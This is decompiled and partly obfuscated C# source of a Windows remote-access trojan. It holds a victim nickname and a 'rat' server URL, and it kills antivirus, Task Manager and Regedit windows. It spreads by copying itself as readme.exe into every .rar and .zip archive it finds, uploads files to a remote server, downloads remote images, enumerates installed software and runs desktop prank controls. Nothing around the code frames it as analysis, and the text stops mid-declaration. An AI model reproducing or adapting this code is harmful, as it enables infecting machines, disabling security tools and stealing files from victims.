using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using sokayim.My;

namespace sokayim;

[DesignerGenerated]
public class Form1 : Form
{
	public enum MouseEventFlags
	{
		LeftDown = 2,
		LeftUp = 4,
		MiddleDown = 32,
		MiddleUp = 64,
		RightDown = 8,
		RightUp = 16
	}

	public class NativeMethods
	{
		public const int nxrgyczkamxklpp = -1;

		public const int zpysbcblwktzlwvni = 0;

		public const int spigvhtxibpydlzyp = -6;

		public const int navloklmepr = -4;

		public const int navloklmeprokgjf = -2;

		public const int navloklmeprokgjfx = -5;

		public const int zpysbcblwktzlwvn = -1;

		public const int navloklmep = -3;

		public const int zpysbcblwktzlwv = 1;

		public const int navloklmeprokg = 0;

		public const int navloklmeprokgjfxlchnvjphduf = 1;

		public const int navloklmeprok = 2;

		public const int navloklmeprokgjfxlch = 3;

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int wwmxdyhjjwelelmblao(string jdnyenygziamhf, int hpawlshelulgr, ref lazkxsywazpggvneip lazkxsywazpggvne);

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int issjjylkiywxevsa(ref lazkxsywazpggvneip lazkxsywazpggvne, int ordyhwxhdtwcdauxprkd);

		public static lazkxsywazpggvneip issjjylkiywxe()
		{
			lazkxsywazpggvneip lazkxsywazpggvneip = default(lazkxsywazpggvneip);
			lazkxsywazpggvneip.rxrapyfvzfa = new string(new char[32]);
			lazkxsywazpggvneip.ybhpoxcjtpy = new string(new char[32]);
			lazkxsywazpggvneip.arvkvyjyzcvbvug = checked((short)Conversion.Fix(Marshal.SizeOf((object)lazkxsywazpggvneip)));
			return lazkxsywazpggvneip;
		}
	}

	public struct lazkxsywazpggvneip
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string rxrapyfvzfa;

		public short rxrapyfvzfaovlbar;

		public short arvkvyjyzcvbvugajoh;

		public short arvkvyjyzcvbvug;

		public short arvkvyjyzcv;

		public int arvkvyjyzcvbvugajo;

		public int arvkvyjyzcvbvu;

		public int arvkvyjyzcvbvugajohsymspvzronw;

		public int arvkvyjyzcvbvugajohsymspvzronwkmusmnvhahetzie;

		public int arvkvyjyzcvb;

		public short arvkvyjyzcvbv;

		public short arvkvyjyzcvbvugajohsym;

		public short arvkvyjyzcvbvuga;

		public short arvkvyjyzcvbvugajohsymsp;

		public short arvkvyjyzcvbvugajohsymspvzronwkmusmnvh;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string ybhpoxcjtpy;

		public short ybhpoxcjtpyudo;

		public short ybhpoxcjtpyud;

		public int ybhpoxcjtpyudotjszs;

		public int ftmbvxgktnrgdxxjkv;

		public int ftmbvxgktnrgd;

		public int ftmbvxgktnrgdxxjk;

		public int ftmbvxgktnrgdxxjkvdswcxlvy;

		public int ftmbvxgktnr;

		public int ftmbvxgktn;

		public int ftmbvxgktnrgdxxjkvdswcxlvyhucxyrgmhzmki;

		public int ftmbvxgktnrgdxxjkvdswcxlvyhucxyrgmhz;

		public int ftmbvxgktnrgdxxjkvdswcxlvyhucxyrgmhzmkizwirymrnhltbh;

		public int ftmbvxgktnrg;

		public int ftmbvxgktnrgdxx;
	}

	private enum ifuxfmgxxxvnrdcCmd : uint
	{
		GW_HWNDFIRST,
		GW_HWNDLAST,
		GW_HWNDNEXT,
		GW_HWNDPREV,
		GW_OWNER,
		GW_CHILD,
		GW_ENABLEDPOPUP
	}

	private enum SW
	{
		Hide = 0,
		Normal = 1,
		ShowMinimized = 2,
		ShowMaximized = 3,
		ShowNoActivate = 4,
		Show = 5,
		Minimize = 6,
		ShowMinNoActive = 7,
		ShowNA = 8,
		Restore = 9,
		ShowDefault = 10,
		ForceMinimize = 11,
		Max = 11
	}

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("draw")]
	private Timer _draw;

	[AccessedThroughProperty("rtb1")]
	private RichTextBox _rtb1;

	[AccessedThroughProperty("rtb2")]
	private RichTextBox _rtb2;

	[AccessedThroughProperty("clipb")]
	private Timer _clipb;

	[AccessedThroughProperty("CAPS")]
	private Timer _CAPS;

	[AccessedThroughProperty("http")]
	private Timer _http;

	[AccessedThroughProperty("runchat")]
	private Timer _runchat;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	public int sifwurwopydslv;

	public object mynick;

	private const int pxlapybtmhphnxhluw = 61760;

	private const int pxlapybtmhphnx = 274;

	private string lkzopjlclcnrmr;

	private const int nxrgyczkamxklpp = -1;

	private const int nxrgyczkamx = 1;

	private const long nxrgyczkamxklppnpofrpt = 2L;

	private const int zpysbcblwktz = 32;

	private const int zpysbcblwk = 32;

	private const int zpysbcblwktzlwvni = 0;

	private const int zpysbcblwktzlwv = 1;

	private const int zpysbcblwktzlwvn = -1;

	private string urjyxhgingmvxauy;

	private string[] options;

	private string text1;

	private string text2;

	private string text3;

	private string text4;

	private string text5;

	private string text6;

	private string text7;

	private string text8;

	private string text9;

	private string text10;

	private const string rblxdzucffbj = "PitonFucker";

	private const string aupijzwdfcvyoew = "\r\n";

	public const int yecndasrbrzozwmlh = 0;

	public const int yecndasrbrzozwmlhm = 256;

	private const int kxwojbtgywmhel = 12;

	private const int kxwojbtgywmheljvbri = 13;

	private int jllhuftmpoyaish;

	private string jllhuftmpoy;

	private const int tefolssvlxeircwrxa = 20;

	private const int tefolssvlxeircwrx = 20;

	private const int ootufvkihlfbwz = 2;

	private const int xhzflvoihjanwfsaw = 128;

	private const int xhzflvoihjanw = 64;

	private int byvdfeboojkaiistklhe;

	private const int usjkfzhydzbgha = 524288;

	private const int usjkfzhydzbghaejhnlzpfzjfrwf = 793;

	private long cjwxwjrrgiizwhymu;

	private long cjwxwjrrgi;

	private long cjwxwjrrgiizwhym;

	private long cjwxwjrrgii;

	private long cjwxwjrrgiizwhymuwnadv;

	private string cjwxwjrrgiizwhymuw;

	private const int mctgryrxcspghroitjh = 2;

	private const int mctgryrxcsp = 91;

	private const int gwgzzbpbtlcdzgeb = 1;

	private const int gwgzzbpbtlcdz = 2;

	private const int gwgzzbpbtlc = 4;

	private const int cjucrdiopwdy = 61808;

	private const int cjucrdiopwd = 20;

	private const int cjucrdiopwdyfb = 1;

	private WebClient kaipkprjtlkmz;

	public object site;

	private string utnaroyjti;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual Timer draw
	{
		get
		{
			return _draw;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_draw = value;
		}
	}

	internal virtual RichTextBox rtb1
	{
		get
		{
			return _rtb1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_rtb1 = value;
		}
	}

	internal virtual RichTextBox rtb2
	{
		get
		{
			return _rtb2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_rtb2 = value;
		}
	}

	internal virtual Timer clipb
	{
		get
		{
			return _clipb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_clipb = value;
		}
	}

	internal virtual Timer CAPS
	{
		get
		{
			return _CAPS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CAPS = value;
		}
	}

	internal virtual Timer http
	{
		get
		{
			return _http;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_http = value;
		}
	}

	internal virtual Timer runchat
	{
		get
		{
			return _runchat;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_runchat = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		sifwurwopydslv = Conversions.ToInteger("0");
		mynick = "victim";
		lkzopjlclcnrmr = null;
		urjyxhgingmvxauy = "";
		kaipkprjtlkmz = new WebClient();
		site = "http://127.0.0.1/rat/";
		utnaroyjti = "";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		draw = new Timer(components);
		rtb1 = new RichTextBox();
		rtb2 = new RichTextBox();
		clipb = new Timer(components);
		CAPS = new Timer(components);
		http = new Timer(components);
		runchat = new Timer(components);
		Button1 = new Button();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		RichTextBox obj = rtb1;
		Point location = new Point(398, 169);
		((Control)obj).set_Location(location);
		((Control)rtb1).set_Name("rtb1");
		RichTextBox obj2 = rtb1;
		Size size = new Size(36, 16);
		((Control)obj2).set_Size(size);
		((Control)rtb1).set_TabIndex(1);
		rtb1.set_Text("");
		((Control)rtb1).set_Visible(false);
		RichTextBox obj3 = rtb2;
		location = new Point(398, 145);
		((Control)obj3).set_Location(location);
		((Control)rtb2).set_Name("rtb2");
		RichTextBox obj4 = rtb2;
		size = new Size(36, 16);
		((Control)obj4).set_Size(size);
		((Control)rtb2).set_TabIndex(2);
		rtb2.set_Text("");
		((Control)rtb2).set_Visible(false);
		http.set_Interval(1000);
		runchat.set_Enabled(true);
		runchat.set_Interval(1);
		((ButtonBase)Button1).set_Image((Image)componentResourceManager.GetObject("Button1.Image"));
		((ButtonBase)Button1).set_ImageAlign((ContentAlignment)16);
		Button button = Button1;
		location = new Point(47, 34);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(109, 29);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Close server");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		Label label = Label1;
		location = new Point(1, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(212, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("This is test mode. Check hideform to hide it.");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		size = new Size(208, 75);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)rtb2);
		((Control)this).get_Controls().Add((Control)(object)rtb1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public object wigenzzvovostmhm()
	{
		object result = default(object);
		return result;
	}

	public object stpwwyfynpesteslln()
	{
		object result = default(object);
		try
		{
			while (sifwurwopydslv == 1)
			{
				string text = "Lab|White|Skype|Live|Runescape|Maplestory|Assassin|Diagnostic|Task|Manager|Control|Panel|OTL|Anti|Virus|Regedit|Registry|Spyware|Adware|Trojan|Config|Startup|Run|System|Configuration|Hijack|Command|Prompt|Hack";
				string[] array = Strings.Split(text, "|", -1, (CompareMethod)0);
				Process[] processes = Process.GetProcesses();
				Process[] array2 = processes;
				foreach (Process process in array2)
				{
					string text2 = process.MainWindowTitle.ToLower();
					Thread.Sleep(20);
					string[] array3 = array;
					foreach (string text3 in array3)
					{
						if (text2.Contains(text3.ToLower()))
						{
							try
							{
								process.Kill();
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(3);
						}
					}
				}
				Thread.Sleep(3000);
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private object tfuvubyxfobpiczfubi(string bygyczzthki)
	{
		WebClient webClient = new WebClient();
		string text = bygyczzthki.Substring(checked(bygyczzthki.Length - 4));
		if (!File.Exists(Path.GetTempPath() + "wallpaper" + text))
		{
			webClient.DownloadFile(bygyczzthki, Path.GetTempPath() + "wallpaper" + text);
		}
		else
		{
			File.Delete(Path.GetTempPath() + "wallpaper" + text);
			webClient.DownloadFile(bygyczzthki, Path.GetTempPath() + "wallpaper" + text);
		}
		Image val = Image.FromFile(Path.GetTempPath() + "wallpaper" + text);
		val.Save(Path.GetTempPath() + "\\wallpaper.bmp", ImageFormat.get_Bmp());
		string lpvParam = Path.GetTempPath() + "\\wallpaper.bmp";
		SystemParametersInfoA(20, 0, ref lpvParam, 1);
		((Control)this).Hide();
		return null;
	}

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long iccjnbstgpwxlevdg(int ordyhwxhdtwcdau, int YyY);

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long iccjnbstgpwxlevdgtnjmdtboojedeyyax(ref Point romlbdxwggpzc);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(MouseEventFlags ordyhwxhdtwcdauxprkd, int ordyhwxhdtwcdaux, int dyy, int cButtons, int hyhlnmtkpsgw);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lexgujkwogdfsavncnio();

	private void StartScreenSaver(bool ttwtmhrnljdkjyujmlf)
	{
		try
		{
			int cfoipfswufygzjmfwd = lexgujkwogdfsavncnio();
			if (ttwtmhrnljdkjyujmlf)
			{
				SendMessageA_1(cfoipfswufygzjmfwd, 274, 61760, 0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void spread()
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Conversions.ToString(DateTime.Today)))
		{
			return;
		}
		int num = 0;
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (((Operators.CompareString(driveInfo.DriveType.ToString(), "Fixed", false) == 0) & driveInfo.IsReady) && num == 0)
			{
				lkzopjlclcnrmr = driveInfo.RootDirectory.ToString();
				num = 1;
			}
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), lkzopjlclcnrmr + "\\readme.exe");
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0)))
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string ceocawfilsiwjnpz in array)
			{
				findarchive(ceocawfilsiwjnpz);
			}
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Conversions.ToString(DateTime.Today));
		}
	}

	public void findarchive(string ceocawfilsiwjnpz)
	{
		try
		{
			string[] files = Directory.GetFiles(ceocawfilsiwjnpz);
			string[] array = files;
			foreach (string text in array)
			{
				Thread.Sleep(10);
				if (text.Contains(".rar"))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.Arguments = " a \"" + text + "\" \"" + lkzopjlclcnrmr + "\\readme.exe\"";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.FileName = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0);
					Process.Start(processStartInfo);
					Thread.Sleep(200);
				}
				if (text.Contains(".zip"))
				{
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.Arguments = " a \"" + text + "\" \"" + lkzopjlclcnrmr + "\\readme.exe\"";
					processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo2.CreateNoWindow = true;
					processStartInfo2.FileName = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0);
					Process.Start(processStartInfo2);
					Thread.Sleep(200);
				}
			}
			string[] directories = Directory.GetDirectories(ceocawfilsiwjnpz);
			string[] array2 = directories;
			foreach (string ceocawfilsiwjnpz2 in array2)
			{
				findarchive(ceocawfilsiwjnpz2);
				Thread.Sleep(5);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumDisplaySettingsA(int jdnyenygziamhf, int hpawlshelulgr, ref lazkxsywazpggvneip lazkxsywazpggvne);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ChangeDisplaySettingsA(ref lazkxsywazpggvneip lazkxsywazpggvneip, long lkvgtjazuez);

	public void changeRes(int fnabxroutzb, int theHeightz)
	{
		lazkxsywazpggvneip lazkxsywazpggvne = default(lazkxsywazpggvneip);
		lazkxsywazpggvne.rxrapyfvzfa = new string(new char[33]);
		lazkxsywazpggvne.ybhpoxcjtpy = new string(new char[33]);
		lazkxsywazpggvne.arvkvyjyzcvbvug = checked((short)Marshal.SizeOf(typeof(lazkxsywazpggvneip)));
		if (0 != EnumDisplaySettingsA(0, -1, ref lazkxsywazpggvne))
		{
			lazkxsywazpggvne.ybhpoxcjtpyudotjszs = fnabxroutzb;
			lazkxsywazpggvne.ftmbvxgktnrgdxxjkv = theHeightz;
			lazkxsywazpggvne.ybhpoxcjtpyudotjszs = fnabxroutzb;
			lazkxsywazpggvne.ftmbvxgktnrgdxxjkv = theHeightz;
			int num = ChangeDisplaySettingsA(ref lazkxsywazpggvne, 2L);
			if (num != -1)
			{
				num = ChangeDisplaySettingsA(ref lazkxsywazpggvne, 1L);
			}
		}
	}

	public object uittgcohxmlrj(string cwguoxpcahulymjfjv)
	{
		return Conversions.ToString(Operators.ConcatenateObject(dbxdmcuizjg(cwguoxpcahulymjfjv), uittgcohxmlrjak(cwguoxpcahulymjfjv)));
	}

	public object uittgcohxmlrjak(string cwguoxpcahulymjfjv)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(cwguoxpcahulymjfjv);
		string text = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			text = text + fileInfo.get_Name() + "\r\n";
		}
		return text;
	}

	public object dbxdmcuizjg(string cwguoxpcahulymjfjv)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(cwguoxpcahulymjfjv);
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			text = text + "[DIR] " + directoryInfo2.get_Name() + "\r\n";
		}
		return text;
	}

	private string idpumerztvcjsmhe()
	{
		string text = null;
		string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		foreach (string name2 in subKeyNames)
		{
			using RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
			try
			{
				if (registryKey2.GetValue("DisplayName") != null)
				{
					text = ((registryKey2.GetValue("InstallLocation") != null) ? Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject(Operators.AddObject(Operators.ConcatenateObject(registryKey2.GetValue("DisplayName"), (object)"|"), registryKey2.GetValue("InstallLocation")), (object)Environment.NewLine))) : Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(registryKey2.GetValue("DisplayName"), (object)"|"), (object)"Install ceocawfilsiwjnp not known"), (object)Environment.NewLine))));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return text;
	}

	public string nfgjmgnlogxoap()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return array[1];
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Corrupt(string eoxvactgrwaylkezy, object Corruptionx)
	{
		string text = null;
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Conversions.ToString(Corruptionx)))
		{
			text = Convert.ToBase64String(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Conversions.ToString(Corruptionx)));
		}
		else
		{
			Encoding aSCII = Encoding.ASCII;
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Corruptionx) };
			bool[] array2 = new bool[1] { true };
			object obj = NewLateBinding.LateGet((object)aSCII, (Type)null, "GetBytes", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				Corruptionx = RuntimeHelpers.GetObjectValue(array[0]);
			}
			text = Convert.ToBase64String((byte[])obj);
		}
		FileSystem.FileOpen(1, eoxvactgrwaylkezy, (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(1, text, -1L, false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long dndcgioxdeiwkcl);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(int siwdlkrmxmxr, int wMsgx, int wParamx, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ohpnfugvnbpttlmx);

	public string fcwhxsigtfsoozzirrlv(string ntmignjavaaj, string filePathx)
	{
		string randomFileName = Path.GetRandomFileName();
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("--" + randomFileName);
		stringBuilder.Append("Content-Disposition: form-data; name=\"uploadedfile\";");
		stringBuilder.AppendFormat("filename=\"{0}\"", Path.GetFileName(filePathx));
		stringBuilder.AppendLine();
		stringBuilder.AppendLine("Content-Type: application/octet-stream");
		stringBuilder.AppendLine();
		byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
		byte[] bytes2 = Encoding.ASCII.GetBytes("\r\n--" + randomFileName + "--\r\n");
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(ntmignjavaaj);
		httpWebRequest.ContentType = "multipart/form-data; chtnimgbwioky=" + randomFileName;
		httpWebRequest.ContentLength = checked(bytes.Length + new FileInfo(filePathx).Length + bytes2.Length);
		httpWebRequest.Method = "POST";
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		byte[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(filePathx);
		requestStream.Write(array, 0, array.Length);
		requestStream.Write(bytes2, 0, bytes2.Length);
		requestStream.Close();
		string result = default(string);
		return result;
	}

	private int doatjtoymld(ref lazkxsywazpggvneip hpawlshelulgrxlknm)
	{
		return doatjtoymld(ref hpawlshelulgrxlknm, -1);
	}

	private int doatjtoymld(ref lazkxsywazpggvneip hpawlshelulgrxlknm, int hpawlshelulgr)
	{
		return NativeMethods.wwmxdyhjjwelelmblao(null, hpawlshelulgr, ref hpawlshelulgrxlknm);
	}

	private void ChangeSettings(lazkxsywazpggvneip hpawlshelulgrxlknm)
	{
		NativeMethods.issjjylkiywxevsa(ref hpawlshelulgrxlknm, 0);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendString2A([MarshalAs(UnmanagedType.VBByRefStr)] ref string ohjrzxiyxzo, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int szcsickannvgezuepgCallback);

	public void SetStartCaption(string dcfscajltfenzky)
	{
		try
		{
			int szcsickannvgezuepg = (int)wnonambxwaa("Shell_TrayWnd", null);
			string spz = "button";
			string spz2 = null;
			int siwdlkrmxmxr = FindWindowExA(szcsickannvgezuepg, 0, ref spz, ref spz2);
			string ohpnfugvnbpttlmx = Strings.Mid(dcfscajltfenzky, 1, 5);
			SendMessageA(siwdlkrmxmxr, 12, 256, ref ohpnfugvnbpttlmx);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowTextA(int szcsickannvgezuepg, [MarshalAs(UnmanagedType.VBByRefStr)] ref string jllhuftmpoy);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte nhoxceeokcyxmsgnzo, byte bScan, int ordyhwxhdtwcdauxprkd, int hyhlnmtkpsgw);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lvfbijvnjktweww(int szcsickannvgezuepg, int cfoipfswufygzjmfwdInsertAfter, int xxx, int yyy, int cxxc, int cyyc, int wFlags);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr rzyrilscfyoelcslob(IntPtr cfoipfswufygzjmfwd, int Msgsg, IntPtr wParam, IntPtr ohpnfugvnbpttlm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int rzyrilscfyoelcs(int szcsickannvgezuepg, int nOption);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowExA(int szcsickannvgezuepg, int nclass, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int nilofodmuirt(int szcsickannvgezuepg, int nCmd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int aobcolycetir(int szcsickannvgezuepg, int msgsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string TextStartz);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte nhoxceeokcyxmsgnzox, byte bScan, long ordyhwxhdtwcdauxprkd, long hyhlnmtkpsgw);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr wnonambxwaa(string pygwnigsbtdidobgkyge, string pygwnigsbtdidobgky);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr ifuxfmgxxxvnrdc(IntPtr cfoipfswufygzjmfwd, uint lgtehlwgzgebkjopt);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool nilofodmuirt(IntPtr szcsickannvgezuepg, int vwxpnkegyexnktuplbc);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
